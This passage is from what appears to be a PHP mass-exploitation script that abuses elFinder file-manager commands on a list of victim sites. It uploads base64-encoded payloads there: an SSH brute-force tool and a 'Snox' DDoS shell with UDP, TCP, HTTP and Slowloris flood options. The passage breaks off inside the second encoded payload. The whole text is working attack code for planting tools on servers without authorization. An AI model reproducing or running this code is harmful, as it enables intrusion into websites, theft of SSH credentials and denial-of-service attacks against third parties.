QogICAgICAkZm9yayA9IHBjbnRsX2ZvcmsoKTsNCiAgICAgIGlmKCEkZm9yaykNCiAgICAgIHsNCiAgICAgICRwZXJmb3JtX3NpbmdsZSA9ICR0aGlzLT5TU0goICRob3N0ICwgJHVzZXIgLCB0cmltKCRwYXNzd29yZCkgLCAkb3V0cHV0ICk7DQogICAgICBpZigkcGVyZm9ybV9zaW5nbGUpDQogICAgICB7DQogICAgICBwcmludCAiU2xlZXBpbmcgMTIwIHNlY29uZHMgLCBQUkVTUyBDVFJMICsgQyBOT1chIjsNCiAgICAgIHNsZWVwKDEyMCk7DQogICAgICB9DQogICAgICBleGl0Ow0KICAgICAgfQ0KICAgIH0NCiAgICAkdGhpcy0+d2FpdEZvclRocmVhZEZpbmlzaCgpOw0KICB9DQogIA0KICB9DQogIC8qDQogICogUGVyZm9ybXMgYnJ1dGUgZm9yY2UgdG8gc3BlY2lmaWVkIGNvbWJvIGxpc3QgYXJndW1lbnRzIC1jIDxjb21ib2xpc3Q+IC1vIDxvdXRwdXQ+IC10IDx0aHJlYWQ+DQogICovDQogIGZ1bmN0aW9uIENvbWJvQnJ1dGUoICRjb21ib2xpc3QgLCAkb3V0cHV0ICwgJHRocmVhZCApDQogIHsNCiAgJGNodW5rX2NvbWJvbGlzdCA9IGFycmF5X2NodW5rKCBmaWxlKCRjb21ib2xpc3QpICwgJHRocmVhZCk7DQogIGZvcmVhY2goJGNodW5rX2NvbWJvbGlzdCBhcyAkY29tYm8pDQogIHsNCiAgICBmb3JlYWNoKCRjb21ibyBhcyAkaG9zdHVzZXJwd2QpDQogICAgew0KICAgICR0aGlzLT5jb3VudGVyKys7DQogICAgbGlzdCgkaG9zdCwkdXNlciwkcGFzc3dvcmQpID0gc3BsaXQoIjoiLHRyaW0oJGhvc3R1c2VycHdkKSk7DQogICAgJGZvcmsgPSBwY250bF9mb3JrKCk7DQogICAgaWYoISRmb3JrKQ0KICAgIHsNCiAgICAkdGhpcy0+U1NIKCAkaG9zdCAsICR1c2VyICwgJHBhc3N3b3JkICwgJG91dHB1dCApOw0KICAgIGV4aXQ7DQogICAgfQ0KICAgIA0KICAgIH0NCiAgICAkdGhpcy0+d2FpdEZvclRocmVhZEZpbmlzaCgpOw0KICB9DQogIA0KICB9DQogIC8qDQogICogUGVyZm9ybXMgYnJ1dGUgZm9yY2UgdG8gc3BlY2lmaWVkIGhvc3QgbGlzdCBhcmd1bWVudHMgLWYgPGhvc3RmaWxlPiAtdSA8dXNlcj4gLXcgPHdvcmRsaXN0PiAtbyA8b3V0cHV0PiAtdCA8dGhyZWFkPg0KICAqLw0KICBmdW5jdGlvbiBNdWx0aUJydXRlKCAkaG9zdGxpc3QgLCAkdXNlciAsICR3b3JkbGlzdCAsICRvdXRwdXQgLCAkdGhyZWFkICkNCiAgew0KICAgIGZvcmVhY2goZmlsZSgkaG9zdGxpc3QpIGFzICRob3N0KQ0KICAgIHsNCiAgICAgICRjaHVua193b3JkbGlzdCA9IGFycmF5X2NodW5rKCBmaWxlKCR3b3JkbGlzdCkgLCAkdGhyZWFkICk7DQogICAgICBmb3JlYWNoKCRjaHVua193b3JkbGlzdCBhcyAkcGFzc3dvcmRzKQ0KICAgICAgew0KICAgICAgICBmb3JlYWNoKCRwYXNzd29yZHMgYXMgJHBhc3N3b3JkKQ0KICAgICAgICB7DQogICAgICAgICR0aGlzLT5jb3VudGVyKys7DQogICAgICAgICRmb3JrID0gcGNudGxfZm9yaygpOw0KICAgICAgICBpZighJGZvcmspDQogICAgICAgIHsNCiAgICAgICAgJHRoaXMtPlNTSCggdHJpbSgkaG9zdCkgLCAkdXNlciAsIHRyaW0oJHBhc3N3b3JkKSAsICRvdXRwdXQgKTsNCiAgICAgICAgZXhpdDsNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgfQ0KICAgICAgICAkdGhpcy0+d2FpdEZvclRocmVhZEZpbmlzaCgpOw0KICAgICAgfQ0KICAgIH0NCiAgfQ0KICAvKg0KICAqIFBlcmZvcm1zIGxvZ2luIHRvIGhvc3Qgd2l0aCBzcGVjaWZpZWQgdXNlciBhbmQgcGFzc3dvcmQocykNCiAgKi8NCiAgZnVuY3Rpb24gU1NIKCAkaG9zdCAsICR1c2VyICwgJHBhc3N3b3JkICwgJG91dHB1dCAsICRwb3J0ID0gMjIgKQ0KICB7DQogICAgICAkY29ubmVjdCA9IHNzaDJfY29ubmVjdCggJGhvc3QgLCAkcG9ydCApOw0KICAgICAgaWYoISRjb25uZWN0KQ0KICAgICAgew0KICAgICAgcHJpbnQgIlsiLiR0aGlzLT5jb3VudGVyLiJdIEhvc3Q6ICIuJGhvc3QuIiBDb25uZWN0aW9uIEZhaWxlZFxuIjsNCiAgICAgIGZsdXNoKCk7DQogICAgICBicmVhazsNCiAgICAgIH0NCiAgICAgIGVsc2UNCiAgICAgIHsNCiAgICAgICRhdXRoICAgID0gc3NoMl9hdXRoX3Bhc3N3b3JkKCAkY29ubmVjdCAsICR1c2VyICwgJHBhc3N3b3JkICk7DQogICAgICBpZigkYXV0aCkNCiAgICAgIHsNCiAgICAgICRhID0gIioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKlxuIjsNCiAgICAgICRhLj0gIlsrXSBGb3VuZCFcbiI7DQogICAgICAkYS49ICJbK10gSG9zdDogIi4kaG9zdC4iXG4iOw0KICAgICAgJGEuPSAiWytdIFVzZXI6ICIuJHVzZXIuIlxuIjsNCiAgICAgICRhLj0gIlsrXSBQYXNzd29yZDogIi4kcGFzc3dvcmQuIlxuIjsNCiAgICAgIA0KICAgICAgcHJpbnQgJGEuIlshXSBJZiBZb3UgV2FudCBUbyBTdG9wIEJydXRlIFByZXNzIENUUkwgKyBDIE5vdyFcbioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKlxuIjsNCiAgICAgIHNlbGY6OlNhdmVSZXN1bHQoICRvdXRwdXQgLCAkYSApOw0KICAgICAgcmV0dXJuIHRydWU7DQogICAgICB9DQogICAgICBlbHNlDQogICAgICB7DQogICAgICBwcmludCAiWyIuJHRoaXMtPmNvdW50ZXIuIl0gVHJ5aW5nIEhvc3Q6ICIuJGhvc3QuIiBVc2VybmFtZTogIi4kdXNlci4iIFBhc3N3b3JkOiAiLiRwYXNzd29yZC4iXG4iOw0KICAgICAgZmx1c2goKTsNCiAgICAgIGJyZWFrOw0KICAgICAgfQ0KICAgICAgDQogICAgICB9DQogICAgICANCiAgfQ0KICAvKg0KICAqIEFsbCBlcnJvciBtZXNzYWdlcyBzaG93aW5nIGZyb20gdGhlcmUNCiAgKi8NCiAgZnVuY3Rpb24gc2hvd0Vycm9yTXNnKCAkZXJybm8gKQ0KICB7DQogICAgcHJpbnQgc2VsZjo6TUFJTl9NRVNTQUdFOw0KICAgIGlmKCRlcnJubyA9PSAxKQ0KICAgIHsNCiAgICBwcmludCBzZWxmOjpOT1RfSU5TVEFMTEVEX1NTSDsNCiAgICBleGl0Ow0KICAgIH0NCiAgICBpZigkZXJybm8gPT0gMikNCiAgICB7DQogICAgcHJpbnQgc2VsZjo6Tk9UX0lOU1RBTExFRF9QQ05UTDsNCiAgICBleGl0Ow0KICAgIH0NCiAgICBpZigkZXJybm8gPT0gMykNCiAgICB7DQogICAgcHJpbnQgc2VsZjo6QVJHTUlTUzsNCiAgICBleGl0Ow0KICAgIH0NCiAgICANCiAgfQ0KICAvKg0KICAqIFdhaXRzIGZvciB0aHJlYWRzIHRvIGZpbmlzaA0KICAqLw0KICBmdW5jdGlvbiB3YWl0Rm9yVGhyZWFkRmluaXNoKCkNCiAgew0KICAgIHdoaWxlIChwY250bF93YWl0cGlkKDAsICRzdGF0dXMpICE9IC0xKSB7DQogICAgICAkc3RhdHVzID0gcGNudGxfd2V4aXRzdGF0dXMoJHN0YXR1cyk7DQogICAgfQ0KICB9DQogIC8qDQogICogU2F2ZXMgZXZlcnl0aGluZyB3aXRoIHRoaXMgZnVuY3Rpb24NCiAgKi8NCiAgc3RhdGljIGZ1bmN0aW9uIFNhdmVSZXN1bHQoICRvdXRwdXQsJHRleHQgKQ0KICB7DQogICRvcGVuX2ZpbGUgPSBmb3BlbiggJG91dHB1dCAsICJhIiApOw0KICBmd3JpdGUoICRvcGVuX2ZpbGUgLCAkdGV4dCApOw0KICBmY2xvc2UoICRvcGVuX2ZpbGUgKTsNCiAgfQ0KfQ0KDQojIG1peWFjaHVuZyByZXByZXNlbnRzIC8gamFuaXNzYXJpZXMub3JnIGdyb3VwIA0KPz4=";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done SSH Bruter (sshbrute.php) berhasil di tanam coba cek<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}

?>
<form method="post">
<input type="submit" name="c" value="PLANT Snox Ddoser">
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['c']) {
	foreach($target as $korban) {
		$global = "snox.php";
		$isi_nama_doang = "PD9waHANCiANCg0KIA0KIA0KICAgICAgICAkdHlwZSA9ICRfR0VUWyd0eXBlJ107DQogICAgICAgICRob3N0ID0gJF9HRVRbJ2hvc3QnXTsNCiAgICAgICAgJHRpbWUgPSAkX0dFVFsndGltZSddOw0KICAgICAgICAkcG9ydCA9ICRfR0VUWydwb3J0J107DQogICAgICAgICRwYWdlID0gJF9HRVRbJ3BhZ2UnXTsNCiAgICAkbXluYSA9ICRfU0VSVkVSW1BIUF9TRUxGXTsNCiANCg0KID8+DQoNCg0KPCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQogIDxoZWFkPg0KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4NCiAgICA8dGl0bGU+U04wWCBTSEVMTDogV0VFRUVFRUVFRUVFRUVFRUVFRDwvdGl0bGU+DQogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPg0KICAgIDxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSIiPg0KICAgIDxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iIj4NCg0KICAgIDwhLS0gTGUgc3R5bGVzIC0tPg0KICAgIDxsaW5rIGhyZWY9Imh0dHA6Ly9nZXRib290c3RyYXAuY29tLzIuMy4yL2Fzc2V0cy9jc3MvYm9vdHN0cmFwLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4NCiAgICA8bGluayBocmVmPSJodHRwOi8vZ2V0Ym9vdHN0cmFwLmNvbS8yLjMuMi9hc3NldHMvY3NzL2Jvb3RzdHJhcC1yZXNwb25zaXZlLmNzcyIgcmVsPSJzdHlsZXNoZWV0Ij4NCiAgICA8bGluayBocmVmPSJodHRwOi8vZ2V0Ym9vdHN0cmFwLmNvbS8yLjMuMi9hc3NldHMvY3NzL2RvY3MuY3NzIiByZWw9InN0eWxlc2hlZXQiPg0KICAgIDxsaW5rIGhyZWY9Imh0dHA6Ly9nZXRib290c3RyYXAuY29tLzIuMy4yL2Fzc2V0cy9qcy9nb29nbGUtY29kZS1wcmV0dGlmeS9wcmV0dGlmeS5jc3MiIHJlbD0ic3R5bGVzaGVldCI+DQo8Y2VudGVyPg0KICAgIDxiIHN0eWxlPSJmb250LXNpemU6NDRweDsiPjxmb250IGNvbG9yPSIjMDA5MzAwIj5TPC9mb250Pjxmb250IGNvbG9yPSIjZmZkNzAwIj5uPC9mb250Pjxmb250IGNvbG9yPSIjZmYwMDAwIj4weDwvZm9udD4gU0hFTEw8L2I+DQo8YnI+PGJyPg0KPC9jZW50ZXI+DQo8ZGl2IGNsYXNzPSJ3ZWxsIj4NCjxjZW50ZXI+DQogICAgPD9waHAgaWYoZW1wdHkoJF9HRVRbJ3R5cGUnXSkpIHsgPz48YnI+U0VORCBBVFRBQ0sgRERPUzxicj48YnI+DQo8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJnZXQiPg0KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9Imhvc3QiIHBsYWNlaG9sZGVyPSJIT1NUIj48YnI+DQo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icG9ydCIgcGxhY2Vob2xkZXI9IlBPUlQiPjxicj4NCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ0aW1lIiBwbGFjZWhvbGRlcj0iVElNRSI+PGJyPg0KPHNlbGVjdCBuYW1lPSJ0eXBlIj4NCiAgICA8b3B0Z3JvdXAgbGFiZWw9Ik1ldGhvZGVzIDEiPg0KICAgIDxvcHRpb24gdmFsdWU9IlVEUCI+VURQPC9vcHRpb24+DQogICAgPG9wdGlvbiB2YWx1ZT0iVENQIj5UQ1A8L29wdGlvbj4NCiAgICA8b3B0aW9uIHZhbHVlPSJIVFRQIj5IVFRQPC9vcHRpb24+DQogICAgPG9wdGlvbiB2YWx1ZT0iU0xPV0xPUklTIj5TTE9XTE9SSVM8L29wdGlvbj4NCjwvb3B0Pg0KDQogICAgPG9wdGdyb3VwIGxhYmVsPSJNZXRob2RlcyAyIj4NCiAgICA8b3B0aW9uIHZhbHVlPSJVRFAiPkhPTUUgQ09OTkVDVElPTjwvb3B0aW9uPg0KICAgIDxvcHRpb24gdmFsdWU9IlRDUCI+U1NZTjwvb3B0aW9uPg0KICAgIDxvcHRpb24gdmFsdWU9IkhUVFAiPldFQlNJVEUgQ1JBU0g8L29wdGlvbj4NCiAgICA8b3B0aW9uIHZhbHVlPSJTTE9XTE9SSVMiPldFQlNJVEUgQ1JBU0ggU0xPVzwvb3B0aW9uPg0KPC9vcHQ+DQo8L3NlbGVjdD48YnI+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIiB2YWx1ZT0iU1RBUlQgQVRUQUNLISI+DQo8L2Zvcm0+DQoNCjxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9ImdldCI+DQogICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iIiBjbGFzcz0iYnRuIiB2YWx1ZT0iU1RPUCBDVVJSRU5UIEFUVEFDSyEiPg0KPC9mb3JtPg0KPHNtYWxsPkFQSSBGT1JNQVQ6IGluZGV4LnBocD9ob3N0PVtob3N0XSZwb3J0PVtwb3J0XSZ0aW1lPVt0aW1lXSZ0eXBlPVttZXRob2QgKFVEUC9UQ1AvSFRUUC9TTE9XTE9SSVMpXTwvc21hbGw+DQo8P3BocCB9ID8+DQoNCiA8P3BocA0KICAgICR0eXBlID0gJF9HRVRbJ3R5cGUnXTsNCiAgICAgICAgJGhvc3QgPSAkX0dFVFsnaG9zdCddOw0KICAgICAgICAkdGltZSA9ICRfR0VUWyd0aW1lJ107DQogICAgICAgICRwb3J0ID0gJF9HRVRbJ3BvcnQnXTsNCiAgICAgICAgJHBhZ2UgPSAkX0dFVFsncGFnZSddOw0KICAgICRteW5hID0gJF9TRVJWRVJbUEhQX1NFTEZdOw0KIA0KICAgICAgICBpZiAoIGlzc2V0KCAkX0dFVFsndHlwZSddICkgKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgJHR5cGUgPSAkX0dFVFsndHlwZSddOw0KICAgICAgICAkaG9zdCA9ICRfR0VUWydob3N0J107DQogICAgICAgICR0aW1lID0gJF9HRVRbJ3RpbWUnXTsNCiAgICAgICAgJHBvcnQgPSAkX0dFVFsncG9ydCddOw0KICAgICAgICAkcGFnZSA9ICRfR0VUWydwYWdlJ107DQogICAgJG15bmEgPSAkX1NFUlZFUltQSFBfU0VMRl07DQogDQogICAgICAgICAgICAgICAgaWYgKCAkdHlwZSA9PSAiVURQIiApDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoICRfR0VUWydob3N0J10gIT0gJycgJiYgICRfR0VUWyd0aW1lJ10gIT0gJycgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlIC49IFVEUF9GTE9PRCggJGhvc3QgLCAkdGltZSApOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2UgLj0gJyAgICAgICAgICAgICAgPGI+VURQIEZsb29kPC9iPjxiciAvPjxiciAvPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFnZSAuPSAnICAgICAgICAgICAgICA8Zm9ybSBhY3Rpb249IicgLiAkbXluYSAuICciIG1ldGhvZD0iZ2V0Ij4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2UgLj0gJyAgICAgICAgICAgICAgICAgICAgICA8dGFibGUgY2xhc3M9InRleHQiPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFnZSAuPSAnICAgICAgICAgICAgICAgICAgICAgIDx0cj48dGQ+SG9zdDo8L3RkPjx0ZD48aW5wdXQgdHlwZT0idGV4dCIgc3R5bGU9IndpZHRoOiAxMzBweCIgbmFtZT0iaG9zdCIgPjwvdGQ+PC90cj4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2UgLj0gJyAgICAgICAgICAgICAgICAgICAgICA8dHI+PHRkPlRpbWU6PC90ZD48dGQ+PGlucHV0IHR5cGU9InRleHQiIHN0eWxlPSJ3aWR0aDogMTMwcHgiIG5hbWU9InRpbWUiPjwvdGQ+PC90cj4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2UgLj0gJyAgICAgICAgICAgICAgICAgICAgICA8L3RhYmxlPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFnZSAuPSAnICAgICAgICAgICAgICAgICAgICAgIDxiciAvPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHN0eWxlPSJ3aWR0aDogMjAlIiB2YWx1ZT0iRmxvb2QhIiAvPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFnZSAuPSAnICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InR5cGUiIHZhbHVlPSInIC4gJF9HRVRbJ3R5cGUnXSAuICciPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFnZSAuPSAnICAgICAgICAgICAgICA8L2Zvcm0+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlaWYgKCAkdHlwZSA9PSAiVENQIiApDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoICRfR0VUWydob3N0J10gIT0gJycgJiYgICRfR0VUWyd0aW1lJ10gIT0gJycgJiYgICRfR0VUWydwb3J0J10gIT0gJycgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlIC49IFRDUF9GTE9PRCAoICRob3N0ICwgJHBvcnQgLCAkdGltZSApOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2UgLj0gJyAgICAgICAgICAgICAgPGI+VENQIEZsb29kPC9iPjxiciAvPjxiciAvPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFnZSAuPSAnICAgICAgICAgICAgICA8Zm9ybSBhY3Rpb249IicgLiAkbXluYSAuICciIG1ldGhvZD0iZ2V0Ij4nIC4gIlxuIjs7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlIC49ICcgICAgICAgICAgICAgICAgICAgICAgPHRhYmxlIGNsYXNzPSJ0ZXh0Ij4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2UgLj0gJyAgICAgICAgICAgICAgICAgICAgICA8dHI+PHRkPkhvc3Q6PC90ZD48dGQ+PGlucHV0IHR5cGU9InRleHQiIHN0eWxlPSJ3aWR0aDogMTMwcHgiIG5hbWU9Imhvc3QiID48L3RkPjwvdHI+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlIC49ICcgICAgICAgICAgICAgICAgICAgICAgPHRyPjx0ZD5Qb3J0OjwvdGQ+PHRkPjxpbnB1dCB0eXBlPSJ0ZXh0IiBzdHlsZT0id2lkdGg6IDEzMHB4IiBuYW1lPSJwb3J0IiA+PC90ZD48L3RyPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFnZSAuPSAnICAgICAgICAgICAgICAgICAgICAgIDx0cj48dGQ+VGltZTo8L3RkPjx0ZD48aW5wdXQgdHlwZT0idGV4dCIgc3R5bGU9IndpZHRoOiAxMzBweCIgbmFtZT0idGltZSI+PC90ZD48L3RyPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFnZSAuPSAnICAgICAgICAgICAgICAgICAgICAgIDwvdGFibGU+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlIC49ICcgICAgICAgICAgICAgICAgICAgICAgPGJyIC8+PGlucHV0IHR5cGU9InN1Ym1pdCIgc3R5bGU9IndpZHRoOiAyMCUiIHZhbHVlPSJGbG9vZCEiIC8+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlIC49ICcgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idHlwZSIgdmFsdWU9IicgLiAkX0dFVFsndHlwZSddIC4gJyI+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlIC49ICcgICAgICAgICAgICAgIDwvZm9ybT4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2VpZiAoICR0eXBlID09ICJIVFRQIiApDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoICRfR0VUWydob3N0J10gIT0gJycgJiYgICRfR0VUWyd0aW1lJ10gIT0gJycgJiYgICRfR0VUWydwYWdlJ10gIT0gJycgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlIC49IEhUVFBfRkxPT0QgKCAkaG9zdCAsICRwYWdlICwgJHRpbWUgKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlIC49ICcgICAgICAgICAgICAgIDxiPkhUVFAgRmxvb2Q8L2I+PGJyIC8+PGJyIC8+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlIC49ICcgICAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0iJyAuICRteW5hIC4gJyIgbWV0aG9kPSJnZXQiPicgLiAiXG4iOzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2UgLj0gJyAgICAgICAgICAgICAgICAgICAgICA8dGFibGUgY2xhc3M9InRleHQiPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFnZSAuPSAnICAgICAgICAgICAgICAgICAgICAgIDx0cj48dGQ+SG9zdDo8L3RkPjx0ZD48aW5wdXQgdHlwZT0idGV4dCIgc3R5bGU9IndpZHRoOiAxMzBweCIgbmFtZT0iaG9zdCIgPjwvdGQ+PC90cj4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2UgLj0gJyAgICAgICAgICAgICAgICAgICAgICA8dHI+PHRkPlBhZ2U6PC90ZD48dGQ+PGlucHV0IHR5cGU9InRleHQiIHN0eWxlPSJ3aWR0aDogMTMwcHgiIG5hbWU9InBhZ2UiIHZhbHVlPSIvIj48L3RkPjwvdHI+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlIC49ICcgICAgICAgICAgICAgICAgICAgICAgPHRyPjx0ZD5UaW1lOjwvdGQ+PHRkPjxpbnB1dCB0eXBlPSJ0ZXh0IiBzdHlsZT0id2lkdGg6IDEzMHB4IiBuYW1lPSJ0aW1lIj48L3RkPjwvdHI+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlIC49ICcgICAgICAgICAgICAgICAgICAgICAgPC90YWJsZT4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2UgLj0gJyAgICAgICAgICAgICAgICAgICAgICA8YnIgLz48aW5wdXQgdHlwZT0ic3VibWl0IiBzdHlsZT0id2lkdGg6IDIwJSIgdmFsdWU9IkZsb29kISIgLz4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2UgLj0gJyAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJ0eXBlIiB2YWx1ZT0iJyAuICRfR0VUWyd0eXBlJ10gLiAnIj4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2UgLj0gJyAgICAgICAgICAgICAgPC9mb3JtPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZWlmICggJHR5cGUgPT0gIlNMT1dMT1JJUyIgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCAkX0dFVFsnaG9zdCddICE9ICcnICYmICAkX0dFVFsndGltZSddICE9ICcnICYmICAkX0dFVFsncGFnZSddICE9ICcnICkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFnZSAuPSBTTE9XTE9SSVMgKCAkaG9zdCAsICRwYWdlICwgJHRpbWUgKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlIC49ICcgICAgICAgICAgICAgIDxiPlNsb3dsb3JpczwvYj48YnIgLz48YnIgLz4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2UgLj0gJyAgICAgICAgICAgICAgPGZvcm0gYWN0aW9uPSInIC4gJG15bmEgLiAnIiBtZXRob2Q9ImdldCI+JyAuICJcbiI7Ow0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFnZSAuPSAnICAgICAgICAgICAgICAgICAgICAgIDx0YWJsZSBjbGFzcz0idGV4dCI+JyAuICJcbiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRwYWdlIC49ICcgICAgICAgICAgICAgICAgICAgICAgPHRyPjx0ZD5Ib3N0OjwvdGQ+PHRkPjxpbnB1dCB0eXBlPSJ0ZXh0IiBzdHlsZT0id2lkdGg6IDEzMHB4IiBuYW1lPSJob3N0IiA+PC90ZD48L3RyPicgLiAiXG4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcGFnZSAuPSAnICAgICAgICAgICAgICAgICAgICAgIDx0cj48dGQ+UGFnZTo8L3RkPjx0ZD48aW5wdXQgdHlwZT0idGV4dCIgc3R5bGU9IndpZHRoOiAxMzBweCIgbmFtZT0icGFnZSIgdmFsdWU9Ii8iPjwvdGQ+PC90cj4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2UgLj0gJyAgICAgICAgICAgICAgICAgICAgICA8dHI+PHRkPlRpbWU6PC90ZD48dGQ+PGlucHV0IHR5cGU9InRleHQiIHN0eWxlPSJ3aWR0aDogMTMwcHgiIG5hbWU9InRpbWUiPjwvdGQ+PC90cj4nIC4gIlxuIjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhZ2UgLj0gJyAgICAgI